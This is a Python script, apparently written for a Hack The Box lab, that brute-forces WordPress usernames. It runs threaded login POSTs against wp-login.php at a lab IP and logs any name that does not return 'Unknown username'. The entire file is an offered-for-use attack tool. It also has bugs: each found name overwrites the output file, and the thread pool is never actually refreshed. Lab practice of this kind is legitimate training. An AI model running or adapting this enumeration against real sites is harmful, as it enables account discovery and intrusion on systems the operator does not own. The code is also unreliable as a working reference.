# Created by Ender
# Written 9/28/2023
# Built for attempting the HTB Fortress Akerva

# WARNING :: This is not a super-effecient script!!!

import os, sys, requests, threading, time

try:
    from termcolor import cprint
except:
    print("WARNING: termcolor library is not imported - this library gives COLOR to the terminal output")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install termcolor\n")
    exit(1)

def bruteForce(userListFile, mThreads):
    # Save valid usernames on an output file
    validUsernamesFile = open("./validUsers.txt", "w")

    userArray = []
    nextPayloadIndex = 0

    userList = open(userListFile, "r")
    # iterate through wordlist file
    for username in userList.readlines():
        # .strip() removes the trailing newline char
        userArray.append(str(username.strip()))
    userList.close()

    maxPayloadIndex = len(userArray)
    activeThreads = []

    # start first batch of threads
    for i in range(mThreads):
        nThread = threading.Thread(target=testUsername, args=(userArray[i], nextPayloadIndex, maxPayloadIndex,))
        activeThreads.append(nThread)
        nThread.start()
        
        nextPayloadIndex+=1

        time.sleep(0.075)

    # iterate through the wordlist
    while nextPayloadIndex < maxPayloadIndex:
        # iterate through our active thread array
        for t in activeThreads:
            #Test whether no thread has been created OR is the active thread at said index has finished running
            if (t.is_alive() == False):
                t = threading.Thread(target=testUsername, args=(userArray[nextPayloadIndex], nextPayloadIndex, maxPayloadIndex,))
                t.start()
                nextPayloadIndex+=1

                # time.sleep() allows us to give the system breathing room and to help us avoid thread collisions
                time.sleep(0.075)

    cprint("[+] DONE", "cyan")

def testUsername(username, n, m):
    # These two lines are responsible for printing the progress on a single terminal line
    print("[*] [" + str(n) +"/"+ str(m) + "] Testing " + username, end="\r")
    sys.stdout.flush()

    url = "http://10.13.37.11/wp-login.php"

    header={
        "Host":"10.13.37.11",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"wordpress_test_cookie=WP+Cookie+check",
        "Origin":"10.13.37.11"
    }

    # application/x-www-form-urlencoded format
    data = "log={}&pwd=password".format(username)

    r = requests.post(url, headers=header, data=data)

    # Test if Username is valid
    if ("Unknown username" not in r.text):
        validUsernamesFile = open("./validUsers.txt", "w")
        validUsernamesFile.write(username+"\n")

        cprint("\n[+] " + username + " Discovered!\r", "green")

def main():
    if (len(sys.argv) > 1):
        wordlistPath = sys.argv[1]

        maxThreads = 10
        if (len(sys.argv) == 3):
            maxThreads = int(sys.argv[2])

        if (os.path.isfile(wordlistPath) == False):
            print("[-] File Does Not Exist!")
            print("[*] Check Path for Errors.")
            return

        bruteForce(wordlistPath, maxThreads)
    else:
        print("[*] Usage: python3 script.py [wordlist] [max threads]")

if __name__ == "__main__":
    main()
